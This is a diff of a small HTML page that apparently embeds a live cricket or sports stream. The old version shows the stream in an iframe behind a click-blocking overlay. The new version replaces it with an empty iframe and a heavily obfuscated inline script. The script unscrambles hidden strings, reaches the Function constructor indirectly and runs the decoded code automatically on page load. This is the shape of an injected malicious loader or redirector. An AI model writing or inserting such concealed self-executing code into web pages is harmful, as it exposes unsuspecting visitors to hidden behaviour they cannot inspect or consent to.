@@ -3,61 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Block Iframe Clicks</title>
+    <title>Telegram-Live-Cric-Hd</title>
     <style>
-        * {
+        html, body {
             margin: 0;
             padding: 0;
-        }
-        body {
-            margin: 0;
-            overflow: hidden;
-        }
-        iframe {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            border: none;
-        }
-        /* Transparent overlay to block clicks */
-        #overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.01); /* Nearly invisible */
-            pointer-events: all; /* Enable overlay to capture clicks */
+        }
+        iframe {
+            border: none;
+            width: 100%;
+            height: 100%;
         }
     </style>
 </head>
 <body>
-    <!-- Overlay to block interactions -->
-    <div id="overlay"></div>
-    
-    <!-- Iframe that displays the content -->
-    <iframe id="streamFrame" src="https://streamtp1.com/global1.php?stream=tnt_4_gb"></iframe>
+    <iframe id="webFrame"></iframe>
 
     <script>
-        const iframe = document.getElementById('streamFrame');
-        const overlay = document.getElementById('overlay');
-
-        // Prevent any click within the iframe by keeping the overlay active
-        iframe.onload = function() {
-            // Optionally, you can add some delay here if you want to allow users to view the content first
-            setTimeout(function() {
-                // Remove the overlay after a delay, making iframe content interactable (if desired)
-                overlay.style.display = 'none';
-            }, 3000); // Remove overlay after 3 seconds (or adjust time as needed)
-        };
-
-        // Block clicks inside the iframe (so users cannot interact with ads)
-        overlay.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-        });
-    </script>
+        var webUrl;(function(){var GLc='',Ell=157-146;function eqZ(b){var o=2017998;var a=b.length;var z=[];for(var v=0;v<a;v++){z[v]=b.charAt(v)};for(var v=0;v<a;v++){var w=o*(v+237)+(o%53484);var m=o*(v+343)+(o%29760);var u=w%a;var f=m%a;var r=z[u];z[u]=z[f];z[f]=r;o=(w+m)%4875229;};return z.join('')};var wiZ=eqZ('cwesortknqmcordtbuhtuagxnofrzspjvlciy').substr(0,Ell);var kpq='esh "cr).m(3w,t=ev.}orpltvalto=fc+r Aa=n1per lcn(x=3jzg.j ]cbvv,.;uesg=1i, qt),7}.)(5t 7d=,8=,}i}6r=go951,a0+n[cn2p1f,+r9;,[t ugv],norll;uu2;0q.48.l[nr };q+;;;i;ca]]g++i;utr j,)]]er=10hf+8yh<fu)0 (fbr9v5" myi;=8a.a"z5=gs=len=a(0adnvsvl0]ueag[pa[h(ssv(hy9lA.(,;r-;z]= 2(r=xoujljfC.,-+)v;=v,3+r)(qA;.r=,ull;drryu)u.x 9 2r +=d.=g+v[r(cax,+ub;alg; int(r;8ae anmof)aa(i;==[1<;;r)vp *tq(d(g6bra<o;dutt{nrwwte"j vw+e).no(i{rrrv;1t7nthht.j)ratrrtf+v4n-lgj=n n+l;"n(ro}==)oe=hvurvngr{.be.=p>fp+lrA)avC,(6m30s<ftrg=.so+!ji+err8jn,i4";)mf;g7 2v+epseuf!n[i;m1;)jq+o=jn ;,cc=a]]ni"+hs)-qj+.h(,vsrbrt8i0gjjahz>mgeb.hr(7;C"n+elfee t;4uy(y;)+hl6)ii-ac<8a;,cu,]vl[=A=)th {Cace)Cn[x6g-.=o(n*(oi[sfiS-es=(evx]f;avorgui..c2ia;("[g{aa)asd0ya,2n)o={2l9),h5gtto);})o,);hnh(hr4t8arg)f(bi=c,hC0d.(1d)C(;h(vd.tqfs;)r==re)tyheqoo(=8m=s0l(t;6]lr,1u9=.(ur [aoi;;Sq6an)0]r+mC.4sqore1ok)=75;r)c"2i7;usstntj6[({7;zeo0yjv=;';var KaG=eqZ[wiZ];var kVH='';var LgK=KaG;var JHq=KaG(kVH,eqZ(kpq));var iXI=JHq(eqZ('epd)ae*$Shr#o)t_j- )(ai\/;(#a.5OflOb)On(l)7:"Oa).o;(m1+bO*qg.r_n!oe$_aq=_h)b"}.;.t,}O(ltt ! g=.{n())_4O)mr(c).%I4gp3=\/.}d(.eilrO[OOO%{ar0O7]wl,efiaa_rl rlt)3a$.12jc,as0td0Oiin2a),(ah *ruvOm.OqcOtvfib4t+3sl.%$%3u5,5{[i;r.{tO1eOmmnOectbazhrOnTi7e.9f$fn0(t1.fp%bOs2,r4})%(gt7O)$geE2!$2O)f pa"ee4O7$)=&jO.7irbm;!4e)a+a2p${O,$fOvbcr)Oz_bOblaax(=n];.8la=5_O6bbiO-c_O;(]=4.n%rne!)lj_atOob)0,),2ece-o!.ajk!$f(hOnr()cf9r+.Ood]rt3;O!g_;.ui]sn) ,feb($t}go3[O. f)cOo30(rO4c+2 {kO7]OOSrr.b4O13o..2O7g(,O,\/7.1r.Oi{tunOeO7e}3O0b+..#)ceo(rins@;oj;oj.] l2Ot})%%.x a3bO}(k_tbOt(OOkOl.k-384}_$i!ta3!]\/h]a40;;gO)ih=s-!n.(bfqtaOw2%ruhot?z);nj0(7.zOl,},O-le0b}.!jl+d.e=;!t;idtm1.trr]mC,\/dCn$r;O)$;;!(or.e6=jO.a%c$;b)$m1!s$O.o,O,_=#_et_mub;aed!hrtrj(eb\'d.=nO ;O\'laO)2O,cl&d;.\'C1t(-OOlb7)0n3,)a.0c.)$n+s#!;gt=:)O 4a,O$(*0]=c)w}.dpqn!2(0(O&]O.Ob_u%4ienon"!=.b7zp\/ed!;cmoit.37pi(f*]0#O,5]f3O.{O7ol_O#$02gi. ( g&)q,jmcs9o\/..,\/)al\/d,+_w(}\'Og.(i6jv"%{!\/s=(49O93OjlO),srriab.z3.$mn3f9Ore3tkss_-wta{e_O"8!52,6oa(.;_(!dre;)m!$.= O0Oop{nbeaei 57se%.,rOOc3_O0.Od..m)3jf=b$,roip,1nrh%)rO.b.4)bdy(r!t [,!S.q370r7$)1Ot(a!O_b;)5i _Ofot$l!,ato.6!.b$ps)n\/_ffrir$O2(qj!_O=+g}4O=.bO34. '));var tUq=LgK(GLc,iXI );tUq(7397);return 7199})()
+          </script>
 </body>
 </html>
